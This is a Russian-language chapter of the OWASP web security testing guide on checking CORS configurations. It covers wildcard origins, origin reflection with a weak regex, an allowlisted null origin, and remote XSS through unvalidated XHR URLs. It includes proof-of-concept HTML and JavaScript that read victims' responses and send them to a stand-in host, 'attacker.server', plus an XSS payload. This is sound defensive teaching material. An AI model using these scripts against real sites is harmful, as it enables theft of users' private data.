# Совместное использование ресурсов между разными источниками (CORS)

| ID |
| --- |
| WSTG-CLNT-07 |

## Резюме

[Механизм совместного использования ресурсов между разными источниками](https://en.wikipedia.org/wiki/Cross-origin_resource_sharing) (Cross-Origin Resource Sharing, CORS) позволяет веб-браузеру выполнять междоменные запросы с использованием API XMLHttpRequest (XHR) Level 2 (L2) контролируемым образом. Ранее API XHR L1 допускал отправку запросов исключительно в пределах одного источника, что ограничивалось [правилом ограничения домена](https://developer.mozilla.org/en-US/docs/Web/Security/Defenses/Same-origin_policy) (Same-Origin Policy, SOP).

Запросы между разными источниками содержат заголовок `Origin`, который определяет домен, инициирующий запрос, и всегда отправляется на сервер. Спецификация CORS определяет протокол взаимодействия веб-браузера и сервера для выяснения того, разрешен ли конкретный кросс-доменный запрос. Для реализации этого механизма используются HTTP-[заголовки](https://en.wikipedia.org/wiki/Cross-origin_resource_sharing#Headers).

Стандарт [WHATWG Fetch Living Standard (CORS Protocol)](https://fetch.spec.whatwg.org/#http-cors-protocol) (пришедший на смену устаревшей спецификации W3C CORS) предписывает, что для «непростых» (non-simple) запросов (любых запросов, отличных от базовых GET или POST, либо запросов, использующих учетные данные), должен предварительно отправляться предварительный запрос (pre-flight OPTIONS request), чтобы убедиться, что тип операции не окажет деструктивного воздействия на данные. Предварительный запрос проверяет методы и заголовки, разрешенные сервером, а также допустимость передачи учетных данных. На основе ответа на запрос OPTIONS браузер принимает решение о том, разрешено ли выполнение основного запроса.

### Заголовки Origin и Access-Control-Allow-Origin

Заголовок запроса `Origin` всегда передается браузером при CORS-запросе и указывает источник запроса. Заголовок `Origin` невозможно модифицировать средствами JavaScript, так как [браузер (user-agent) блокирует его изменение](https://developer.mozilla.org/en-US/docs/Glossary/Forbidden_request_header); тем не менее полагаться на этот заголовок для проверок разграничения доступа не рекомендуется, поскольку его можно подделать за пределами браузера (например, через прокси-сервер). Поэтому необходимо гарантировать, что для защиты конфиденциальных данных используются протоколы прикладного уровня.

`Access-Control-Allow-Origin` — это заголовок ответа, используемый сервером для указания доменов, которым разрешено читать тело ответа. В соответствии со спецификацией CORS именно на клиент возлагается обязанность проверять и применять ограничения на чтение данных ответа на основе данного заголовка.

С точки зрения тестирования безопасности необходимо искать небезопасные конфигурации — например, использование подстановочного символа `*` (wildcard) в качестве значения заголовка `Access-Control-Allow-Origin`, что означает разрешение доступа для всех доменов без исключения. Другой небезопасный пример — когда сервер без дополнительных проверок возвращает полученный заголовок Origin обратно в ответе, что способно привести к несанкционированному доступу к конфиденциальным данным. Конфигурация с безусловным разрешением междоменных запросов крайне небезопасна и в общем случае недопустима, за исключением публичных API, изначально предназначенных для всеобщего открытого доступа.

### Access-Control-Request-Method и Access-Control-Allow-Method

Заголовок `Access-Control-Request-Method` используется браузером при выполнении предварительного OPTIONS-запроса, позволяя клиенту указать метод, который будет задействован в основном запросе. В свою очередь, заголовок ответа `Access-Control-Allow-Method` используется сервером для декларирования методов, разрешенных для использования клиентами.

### Access-Control-Request-Headers и Access-Control-Allow-Headers

Эти два заголовка согласуются между браузером и сервером для определения перечня HTTP-заголовков, которые допустимо передавать при выполнении кросс-доменного запроса.

### Access-Control-Allow-Credentials

Данный заголовок ответа позволяет браузерам читать содержимое ответа при передаче учетных данных (credentials: cookies, HTTP-аутентификация, клиентские SSL-сертификаты). При отправке этого заголовка веб-приложение обязано указать конкретный источник в значении `Access-Control-Allow-Origin`. Заголовок `Access-Control-Allow-Credentials` не может использоваться совместно с маской `*` в заголовке `Access-Control-Allow-Origin`, как в следующем примере:

```http
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```

### Валидация входных данных

XHR L2 для обеспечения обратной совместимости предоставляет возможность формирования кросс-доменных запросов через XHR API. Это способно привнести уязвимости, отсутствовавшие в XHR L1. Особый интерес для эксплуатации представляют URL-адреса, передаваемые в XMLHttpRequest без валидации — в частности, если разрешены абсолютные URL, так как это может привести к внедрению стороннего кода. Аналогичным образом уязвимой частью приложения могут стать ситуации, когда данные ответа не экранируются, а тестировщик способен контролировать их через пользовательский ввод.

### Другие заголовки

В процессе взаимодействия могут участвовать и другие заголовки, такие как `Access-Control-Max-Age`, определяющий время кэширования результатов pre-flight запроса в браузере, или `Access-Control-Expose-Headers`, указывающий, какие заголовки ответа безопасно раскрывать для API спецификации CORS.

Подробный обзор заголовков CORS представлен в документации [CORS MDN document](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS#The_HTTP_response_headers).

## Цели тестирования

- Идентифицировать эндпоинты, реализующие CORS.
- Убедиться, что конфигурация CORS безопасна или не несет угроз.

## Методика тестирования

Такие инструменты, как [ZAP](https://www.zaproxy.org), позволяют тестировщикам перехватывать HTTP-заголовки, раскрывая особенности реализации CORS. Особое внимание следует уделять заголовку Origin, чтобы выяснить, какие домены являются доверенными. Кроме того, в ряде случаев требуется ручной анализ кода JavaScript, чтобы определить, подвержен ли он инъекциям кода из-за некорректной обработки пользовательского ввода.

### Ошибки конфигурации CORS

Установка подстановочного знака в заголовке `Access-Control-Allow-Origin` (то есть `Access-Control-Allow-Origin: *`) небезопасна, если ответ содержит конфиденциальную информацию. Хотя данный заголовок не может одновременно сочетаться с `Access-Control-Allow-Credentials: true`, он представляет серьезную угрозу в архитектурах, где разграничение доступа возложено исключительно на правила сетевого экрана или IP-адреса источника, а не защищено механизмами аутентификации.

#### Подстановочный символ в заголовке Access-Control-Allow-Origin

Тестировщик может проверить наличие заголовка `Access-Control-Allow-Origin: *` в сообщениях ответа HTTP.

```http
HTTP/1.1 200 OK
[...]
Access-Control-Allow-Origin: *
Content-Length: 4
Content-Type: application/xml

[Response Body]
```

Если ответ содержит конфиденциальные данные, злоумышленник может похитить их с помощью XHR:

```html
<html>
    <head></head>
    <body>
        <script>
            var xhr = new XMLHttpRequest();
            xhr.onreadystatechange = function() {
                if (this.readyState == 4 && this.status == 200) {
                    var xhr2 = new XMLHttpRequest();
                    // attacker.server: слушатель атакующего для перехвата ответа
                    xhr2.open("POST", "https://attacker.server", true);
                    xhr2.send(xhr.responseText);
                }
            };
            // victim.site: уязвимый сервер с заголовком `Access-Control-Allow-Origin: *` 
            xhr.open("GET", "https://victim.site", true);
            xhr.send();
        </script>
    </body>
</html>
```

#### Динамическая политика CORS

Современное веб-приложение или API может быть спроектировано для динамического разрешения кросс-доменных запросов — как правило, для обслуживания поддоменов, как в следующем примере:

```php
if (preg_match('|\.example.com$|', $_SERVER['SERVER_NAME'])) {
   header("Access-Control-Allow-Origin: {$_SERVER['HTTP_ORIGIN']}");
   ...
}
```

В этом примере разрешены все запросы от поддоменов `example.com`. Необходимо убедиться, что используемое для сопоставления регулярное выражение является полным и корректным. В противном случае, если бы проверка выполнялась простым поиском строки `example.com` (без привязки к концу строки `$`), атакующие могли бы обойти политику CORS, добавив свой домен к заголовку `Origin`.

```http
GET /test.php HTTP/1.1
Host: example.com
[...]
Origin: https://example.com.attacker.com
Cookie: <session cookie>
```

Если при отправке приведенного выше запроса возвращается ответ с заголовком `Access-Control-Allow-Origin`, значение которого совпадает с переданным атакующим источником, злоумышленник сможет прочитать ответ и получить доступ к конфиденциальной информации, доступной только пользователю-жертве.

```http
HTTP/1.1 200 OK
[...]
Access-Control-Allow-Origin: https://example.com.attacker.com
Access-Control-Allow-Credentials: true
Content-Length: 4
Content-Type: application/xml

[Response Body]
```

#### Значение Null Origin в списке разрешенных

Заголовок `Origin` может принимать значение `null` в ряде специфических ситуаций: например, при запросах, инициированных из локального файла, при перенаправлениях или при обработке сериализованных объектов. Разработчики иногда добавляют источник `null` в список разрешенных (allowlist) для облегчения локальной разработки или поддержки клиентов без веб-интерфейса.

Однако значение `null` фактически выполняет роль «джокера» (wildcard), который может быть проэксплуатирован. Атакующий может программно сгенерировать запрос с источником `null`, используя изолированный фрейм `iframe` с атрибутом `sandbox`.

Если сервер просто отражает источник `null` в заголовках ответа — особенно при включенном флаге передачи учетных данных (credentials), — это формирует уязвимость, аналогичную общему wildcard.

```http
HTTP/1.1 200 OK
[...]
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
Content-Length: 4
Content-Type: application/xml
```

В сценарии атаки злоумышленник размещает изолированный `iframe` на контролируемом им вредоносном сайте. Атрибут `sandbox` принуждает браузер устанавливать значение `Origin` для всех запросов, отправляемых из этого фрейма, равным `null`.

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,
    <script>
        fetch('https://victim.site/sensitive-data', {
            method: 'GET',
            credentials: 'include' // Необходимо для отправки cookies/заголовков авторизации
        })
        .then(response => response.text())
        .then(data => {
            // Эксфильтрация данных на сервер атакующего
            location.href = 'https://attacker.server/log?data=' + btoa(data);
        });
    </script>">
</iframe>
```

В результате браузер рассматривает запрос как исходящий от источника `null`, сервер разрешает источник `null`, и атакующий успешно считывает конфиденциальный ответ.

### Недостатки валидации входных данных

Концепцию CORS можно рассмотреть и с диаметрально противоположной стороны. Атакующий может намеренно ослабить политику CORS на своем ресурсе с целью внедрения кода в целевое веб-приложение.

#### Удаленный XSS с использованием CORS

Данный код запрашивает ресурс, переданный после символа `#` в URL, изначально предназначенный для получения страниц в пределах того же сервера.

Уязвимый код:

```html
<script>
    var req = new XMLHttpRequest();

    req.onreadystatechange = function() {
        if(req.readyState==4 && req.status==200) {
            document.getElementById("div1").innerHTML=req.responseText;
        }
    }

    var resource = location.hash.substring(1);
    req.open("GET",resource,true);
    req.send();
</script>

<body>
    <div id="div1"></div>
</body>
```

Например, такой запрос отобразит содержимое файла `profile.php`:

`https://example.foo/main.php#profile.php`

Запрос и ответ, сгенерированные для `https://example.foo/profile.php`:

```http
GET /profile.php HTTP/1.1
Host: example.foo
[...]
Referer: https://example.foo/main.php
Connection: keep-alive

HTTP/1.1 200 OK
[...]
Content-Length: 25
Content-Type: text/html

[Response Body]
```

Однако при отсутствии валидации URL можно внедрить сторонний сценарий, который будет загружен и выполнен в контексте безопасности домена `example.foo` при обращении к следующему URL:

```text
https://example.foo/main.php#https://attacker.bar/file.php
```

Запрос и ответ, сгенерированные при обращении к `https://attacker.bar/file.php`:

```http
GET /file.php HTTP/1.1
Host: attacker.bar
[...]
Referer: https://example.foo/main.php
origin: https://example.foo

HTTP/1.1 200 OK
[...]
Access-Control-Allow-Origin: *
Content-Length: 92
Content-Type: text/html

Injected Content from attacker.bar <img src="#" onerror="alert('Domain: '+document.domain)">
```
